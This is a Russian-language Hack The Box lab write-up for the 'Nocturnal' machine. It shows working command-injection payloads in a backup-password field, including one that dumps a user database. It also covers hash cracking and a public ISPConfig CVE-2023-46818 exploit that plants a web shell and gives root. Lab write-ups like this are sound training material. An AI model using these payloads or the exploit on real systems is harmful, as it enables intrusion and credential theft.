---
{"dg-publish":true,"permalink":"/paszi/htb-nocturnal/","noteIcon":""}
---

# Nocturnal

Я выбрал nocturnal, так как это один из наиболее простых кейсов.

Начинается атака на машину всегда с энумерации - проверки, какие вообще сервисы на ней доступны внешнему пользователю. Для этого проводится скан портов утилитой nmap.

```shell

nmap -T4 -sV -v -sC 10.10.11.64

Nmap scan report for 10.10.11.64

Host is up (0.10s latency).

Not shown: 866 closed tcp ports (conn-refused), 132 filtered tcp ports (no-response)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)

|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)

|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)

80/tcp open  http    nginx 1.18.0 (Ubuntu)

| http-methods:

|_  Supported Methods: GET HEAD POST

|_http-title: Did not follow redirect to http://nocturnal.htb/

|_http-server-header: nginx/1.18.0 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

На цели запущены ssh и http. Раз запущен http, значит, существует веб страница, на которую можно зайти. Попробуем зайти на 10.10.11.64 через браузер, получим редирект на на сайт nocturnal.htb, и ошибку загрузки. Это связано с тем, что внутри машины есть утилита, которая позволяет хостить несколько вебсайтов на одной машине, и мы получили редирект на один из сайтов, который также записывается в веб запрос. Чтобы данный редирект работал, нужно чтобы компьютер знал, что этот hostname также является айпи 10.10.11.64.
  

На самом деле в сети не существует хостнеймов, каждый раз, когда мы вписываем в адресную строку адрес, положим, ya.ru, браузер проверяет, есть ли ассоциированный с этим адресом айпи в /etc/hosts, затем спрашивает тот же вопрос у DNS. Поэтому наша задача - вписать в конец файла /etc/hosts строку вида

```shell

10.10.11.64 nocturnal.htb

```

Это позволит нам при перезагрузке страницы увидеть функционал сайта.

![результат nmap](/img/user/image.png)
  

Очевидно, это файлообменник с функционалом логина и регистрации. Формочка логина не реагирует на простейшие вызовы sql инъекции (`' or 1 = 1; #` в пароль). Загрузить на сайт можно только файлы с безобидными расширениями: docx, pdf и подобные.

![меню личного кабинета](/img/user/image-1.png)
  

При наведении на ссылки на файлы мы видим, что у него очень примечательный способ найти, что скачивать.

`http://nocturnal.htb/view.php?username=hacker&file=blank.docx`

Естественно, если попытаться запросить что-либо кроме вышеупомянутых расширений, сайт откажет. Однако возможно использовать wildcard - предполагая, что файлы проверяются на соответствие либо sql либо регулярными выражениями. И действительно, запрос `http://nocturnal.htb/view.php?username=hacker&file=*.docx` вернёт оба загруженных файла.

К сожалению, провернуть подобный трюк с пользователями не получится. Придётся перебирать список наиболее популярных логинов при помощи intruder из burp suite - брутфорсер параметров запросов.


![intruder menu](/img/user/image-2.png)
  

Используя первый найденный лист наиболее популярных логинов и перебрав дозволенные расширения, мы можем найти интересный файл для пользователя amanda - privacy.odt.

![privacy.odt с паролем пользователя повышенных привелегий](/img/user/image-3.png)
  

В нём пароль пользователя сайта с повышенными привелегиями. Мы знаем логин, поэтому можем залогиниться как аманда, часть IT команды Nocturnal. У неё есть панель админа.

![alt text](/img/user/image-4.png)

![alt text](/img/user/image-7.png)

В панели админа находятся исходники всех php файлов а также функция загрузки бэкапа (вместе с её исходником), из которого видно, что пароль вписывается в командную строку. Это можно использовать.

%0A - это кодировка символа "энтер"

Поэтому можно в момент ввода пароля в командную строку прервать ввод, ввести новую команду и получить вывод из неё, если сообщить в пароле что-то вроде: "энтер, команда, энтер"

Вместо пробелов можно использовать символ "tab" (%09)

Тогда мы можем совершить любой запрос в командную строку.

К примеру, команда `%0Abash%09"ls"%0A` конвертируется в `bash "ls"` и соответственно выполняется на сервере. Так мы можем найти любой файл на сервере.

Есть только одна проблема - в директории home есть пользователь tobias, и туда доступа скрипту нет (`%0Abash%09"ls%09%2Fhome%2Ftobias"%0A`)

Однако мы можем найти базу данных sqlite при помощи `%0Abash%09-c%09"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump"%0A`.


Если её выгрузить, можно получить интересные данный сниппет:

```sql

sh: 4: backups/backup_2025-05-30.zip: Permission denied

PRAGMA foreign_keys=OFF;

BEGIN TRANSACTION;

CREATE TABLE users (

    id INTEGER PRIMARY KEY AUTOINCREMENT,

    username TEXT NOT NULL UNIQUE,

    password TEXT NOT NULL

);

INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');

INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');

INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');

INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda');

INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db');

INSERT INTO users VALUES(8,'iso','e906ec779ab4ac6cbfdf30db5cbb3f1c');

INSERT INTO users VALUES(9,'envy','2cfd4560539f887a5e420412b370b361');

INSERT INTO users VALUES(10,'test','098f6bcd4621d373cade4e832627b4f6');

INSERT INTO users VALUES(11,'kali','d6ca3fd0c3a3b462ff2b83436dda495e');

INSERT INTO users VALUES(12,'admin''','c4ca4238a0b923820dcc509a6f75849b');

INSERT INTO users VALUES(13,'juris','de15806759cb3732f16d4f49ff58be01');

INSERT INTO users VALUES(14,'admin ','21232f297a57a5a743894a0e4a801fc3');

INSERT INTO users VALUES(15,'admin  ','21232f297a57a5a743894a0e4a801fc3');

CREATE TABLE uploads (

    id INTEGER PRIMARY KEY AUTOINCREMENT,

    user_id INTEGER NOT NULL,

    file_name TEXT NOT NULL,

    upload_time DATETIME DEFAULT CURRENT_TIMESTAMP,

    FOREIGN KEY(user_id) REFERENCES users(id)

);

INSERT INTO uploads VALUES(4,2,'privacy.odt','2024-10-18 02:05:53');

INSERT INTO uploads VALUES(5,8,'Upgrade_Notice.pdf','2025-05-30 05:57:12');

INSERT INTO uploads VALUES(6,9,'blank.docx','2025-05-30 06:02:30');

INSERT INTO uploads VALUES(7,9,'blank.docx','2025-05-30 06:09:08');

INSERT INTO uploads VALUES(8,8,'Upgrade_Notice.pdf','2025-05-30 06:25:01');

INSERT INTO uploads VALUES(9,8,'Upgrade_Notice.pdf','2025-05-30 06:25:36');

INSERT INTO uploads VALUES(10,8,'Upgrade_Notice.pdf','2025-05-30 06:25:55');

INSERT INTO uploads VALUES(11,8,'rev.php%00.pdf','2025-05-30 06:29:20');

INSERT INTO uploads VALUES(12,8,'rev.php%00.pdf','2025-05-30 06:30:32');

INSERT INTO uploads VALUES(13,8,'%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%72%65%76%2e%70%68%70%25%30%30.pdf','2025-05-30 06:32:06');

INSERT INTO uploads VALUES(14,8,'0.pdf','2025-05-30 06:33:14');

INSERT INTO uploads VALUES(15,8,'0.pdf','2025-05-30 06:33:28');

INSERT INTO uploads VALUES(16,8,'.pdf','2025-05-30 06:33:44');

INSERT INTO uploads VALUES(17,12,'shell.php.pdf','2025-05-30 06:40:31');

INSERT INTO uploads VALUES(18,11,'shell.pdf','2025-05-30 06:51:02');

INSERT INTO uploads VALUES(19,12,'test.php.pdf','2025-05-30 06:52:36');

INSERT INTO uploads VALUES(20,13,'test.php.pdf','2025-05-30 07:39:49');

INSERT INTO uploads VALUES(21,8,'aa.pdf','2025-05-30 08:36:35');

INSERT INTO uploads VALUES(22,8,'<<>>.pdf','2025-05-30 08:38:45');

INSERT INTO uploads VALUES(23,8,'"<<>>.pdf','2025-05-30 08:39:27');

INSERT INTO uploads VALUES(24,8,'''<<>>.pdf','2025-05-30 08:40:11');

INSERT INTO uploads VALUES(25,8,'()=?_|>£#$½¾{[]}<<>>.pdf','2025-05-30 08:41:52');

INSERT INTO uploads VALUES(26,8,'()=?_|>£#$½¾{[]}<<>>.php.xls','2025-05-30 08:43:01');

INSERT INTO uploads VALUES(27,8,'()=?_|>£#$½¾{[]}<<>>.php%00.xls','2025-05-30 08:43:48');

INSERT INTO uploads VALUES(28,8,'0.xls','2025-05-30 08:44:41');

INSERT INTO uploads VALUES(29,8,'()=?_|>£#$½¾{[]}<<>>.php%5c%30.xls','2025-05-30 08:45:00');

INSERT INTO uploads VALUES(30,8,'()=?_|>£#$½¾{[]}<<>>.php%25%35%63%25%33%30.xls','2025-05-30 08:45:32');

INSERT INTO uploads VALUES(31,8,'()=?_|>£#$½¾{[]}<<>>.php .xls','2025-05-30 08:46:01');

INSERT INTO uploads VALUES(32,8,'()=?_|>£#${[]}<>.php .xls','2025-05-30 08:47:12');

INSERT INTO uploads VALUES(33,8,'()=?_|>£#${[]}<>.php%00%00.xls','2025-05-30 08:52:00');

INSERT INTO uploads VALUES(34,8,'()=?_|>£#${[]}<>.php%%00%%00.xls','2025-05-30 08:52:38');

INSERT INTO uploads VALUES(35,8,'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xls','2025-05-30 08:54:17');

DELETE FROM sqlite_sequence;

INSERT INTO sqlite_sequence VALUES('users',15);

INSERT INTO sqlite_sequence VALUES('uploads',35);

COMMIT;

```


Здесь можно увидеть хэшеподобную строку, ассоциированную с тобиасом. Очевидно, это пароль. При помощи радужных таблиц можно получить исходную строку:

![радужная таблица на тобиаса](/img/user/image-6.png)


Тогда у пользователя tobias пароль slowmotionapocalypse. Попробуем подключиться через ssh, найденный в самом начале через nmap.

```shell

ssh tobias@10.10.11.64

The authenticity of host '10.10.11.64 (10.10.11.64)' can't be established.

ED25519 key fingerprint is SHA256:rpVMGW27qcXKI/SxVXhvpF6Qi8BorsH7RNh1jzi8VYc.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.10.11.64' (ED25519) to the list of known hosts.

tobias@10.10.11.64's password:

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)

  

* Documentation:  https://help.ubuntu.com

* Management:     https://landscape.canonical.com

* Support:        https://ubuntu.com/pro

  

System information as of Fri 30 May 2025 09:18:05 AM UTC

  

System load:           0.11

Usage of /:            68.1% of 5.58GB

Memory usage:          29%

Swap usage:            0%

Processes:             233

Users logged in:       0

IPv4 address for eth0: 10.10.11.64

IPv6 address for eth0: dead:beef::250:56ff:fe94:777e

  
  

Expanded Security Maintenance for Applications is not enabled.

  

0 updates can be applied immediately.

  

Enable ESM Apps to receive additional future security updates.

See https://ubuntu.com/esm or run: sudo pro status

  
  

The list of available updates is more than a week old.

To check for new updates run: sudo apt update

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

  
  

Last login: Fri May 30 09:18:08 2025 from 10.10.16.84

tobias@nocturnal:~$ ls

user.txt

tobias@nocturnal:~$ cat user.txt

722f04ab41562f5cd533bba27b5fb8dd

tobias@nocturnal:~$

```

Флаг найден.

# ROOT

К сожалению запустить linpeas на машине не удалось - у неё отсутствует доступ к интернету И возможность получить файл через curl в локальной сети.

На сервере работает apache, рут которого обычно лежит в `/var/www/`, но там ничего интересного кроме странной ссылки:

```shell

tobias@nocturnal:/var/www$ ls -al

total 24

drwxr-xr-x  6 ispconfig ispconfig 4096 Apr 14 09:26 .

drwxr-xr-x 14 root      root      4096 Oct 18  2024 ..

drwxr-xr-x  2 root      root      4096 Mar  4 15:02 html

lrwxrwxrwx  1 root      root        34 Oct 17  2024 ispconfig -> /usr/local/ispconfig/interface/web

drwxr-xr-x  2 www-data  www-data  4096 Jun  8 15:36 nocturnal_database

drwxr-xr-x  4 www-data  www-data  4096 Apr 17 09:02 nocturnal.htb

drwxr-xr-x  4 ispconfig ispconfig 4096 Oct 17  2024 php-fcgi-scripts

```

ISPConfig это панель управления сервером для линукса. Звучит как серьёзная цель, к которой стоит подобраться. Наверняка он уже где-то запущен, проверим занятость портов:

```shell

tobias@nocturnal:/var/www$ netstat -tunl

Active Internet connections (only servers)

Proto Recv-Q Send-Q Local Address           Foreign Address         State

tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN

tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN

tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN

tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN

tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN

tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN

tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN

tcp6       0      0 :::22                   :::*                    LISTEN

udp        0      0 127.0.0.53:53           0.0.0.0:*

```

Видно, что портов открыто больше чем нашёл nmap, следовательно, доступ туда возможен только из localhost. Для того чтобы это эксплуатировать, используем проброс портов, и заходим на веб страницу с формочкой логина.

Используя логин `admin` и пароль пользователя `tobias`, можно войти внутрь и узнать, что версия ISPConfig - `3.2.2`, и на неё существуют уязвимости, в частности https://nvd.nist.gov/vuln/detail/CVE-2023-46818 , на которую уже существует скрипт: https://github.com/ajdumanhug/CVE-2023-46818 . Используем его и получим доступ к рут шеллу, который может прочитать рут флаг

```shell

$ python3 CVE-2023-46818.py http://localhost:8000 admin slowmotionapocalypse

[+] Logging in with username 'admin' and password 'slowmotionapocalypse'

[+] Login successful!

[+] Fetching CSRF tokens...

[+] CSRF ID: language_edit_c6ad8c7d67d42f365b1fde1a

[+] CSRF Key: 69a2aecd482eb59e6e3b0a62fe49c8ee9d9003a9

[+] Injecting shell payload...

[+] Shell written to: http://localhost:8000/admin/sh.php

[+] Launching shell...

  

ispconfig-shell# id

uid=0(root) gid=0(root) groups=0(root)

  

ispconfig-shell# cat /root/root.txt

675fe34c8251ae589dce5113bba579d5

```